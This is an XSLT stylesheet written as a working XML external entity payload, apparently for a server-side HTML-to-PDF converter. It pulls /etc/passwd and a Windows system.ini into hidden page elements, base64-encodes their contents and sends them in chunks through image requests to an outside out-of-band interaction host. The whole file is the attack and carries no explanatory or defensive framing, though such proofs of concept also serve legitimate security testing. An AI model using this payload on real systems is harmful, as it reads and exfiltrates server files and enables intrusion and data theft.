<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY passwd_p        "file:///etc/passwd">
  <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
  <!ENTITY sysini_p        "file:///c:/windows/system.ini">
  <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
]>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns="http://www.w3.org/1999/xhtml">

  <!-- Prevent a second XML declaration and force HTML output -->
  <xsl:output method="html" omit-xml-declaration="yes" encoding="UTF-8"/>

  <xsl:template match="/">

    <!-- DO NOT xsl:copy-of document('') â€” it can inject PIs/DTD before <html> -->

    <html>
      <head>
        <meta charset="utf-8"/>
        <title>PDF Exfil Output</title>
        <style>
          html,body{margin:0;padding:0}
          #r { width:40rem; margin:1rem; font:12px/1.4 system-ui, sans-serif; }
          textarea { width:100%; font:12px/1.4 monospace; }
        </style>
      </head>
      <body>

        <!-- Hidden entity expansion targets -->
        <div style="display:none">
          <p class="&passwd_p;">&passwd_c;</p>
          <p class="&sysini_p;">&sysini_c;</p>
        </div>

        <!-- Visible proof area -->
        <div id="r"></div>

        <script><![CDATA[
          // ---------- utilities ----------
          function b64utf8(s){ return btoa(unescape(encodeURIComponent(s))); }
          function chunk(s,n){ const a=[]; for(let i=0;i<s.length;i+=n) a.push(s.slice(i,i+n)); return a; }
          const sleep = ms => new Promise(r => setTimeout(r, ms));

          // ---------- render proof (use textContent, not innerHTML) ----------
          const r = document.querySelector('#r');

          {
            const lbl = document.createElement('div');
            lbl.textContent = 'remote web url:';
            r.appendChild(lbl);

            const ta = document.createElement('textarea');
            ta.style.height='1.5rem';
            ta.textContent = location.href;
            r.appendChild(ta);

            r.appendChild(document.createElement('br'));
            r.appendChild(document.createElement('br'));
          }

          let raw = '';
          document.querySelectorAll('p').forEach(p => {
            const path = p.className;
            const data = p.textContent; // preserves raw text

            // path
            {
              const lbl = document.createElement('div');
              lbl.textContent = 'local file path:';
              r.appendChild(lbl);

              const ta = document.createElement('textarea');
              ta.style.height='1.5rem';
              ta.textContent = path;
              r.appendChild(ta);
            }

            // content
            {
              const lbl = document.createElement('div');
              lbl.textContent = 'local file content:';
              r.appendChild(lbl);

              const ta = document.createElement('textarea');
              ta.style.height='60rem';
              ta.textContent = data;
              r.appendChild(ta);

              r.appendChild(document.createElement('br'));
              r.appendChild(document.createElement('br'));
            }

            raw += 'PATH:' + path + '\n' + 'DATA:' + data + '\n\n';
          });

          // ---------- exfil (query params, padded base64, throttled) ----------
          const base  = 'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/';
          const b64   = b64utf8(raw);
          const parts = chunk(b64, 350);

          // start marker
          (new Image()).src = base + '?start=1&n=' + parts.length;

          (async () => {
            for (let i = 0; i < parts.length; i++) {
              const img = new Image();
              img.src = base + '?i=' + i + '&n=' + parts.length + '&d=' + encodeURIComponent(parts[i]);
              document.body.appendChild(img);
              await sleep(80); // small pause improves reliability in headless
            }
            (new Image()).src = base + '?end=1&n=' + parts.length;
            await sleep(1000); // give headless time to flush requests
          })();
        ]]></script>

      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
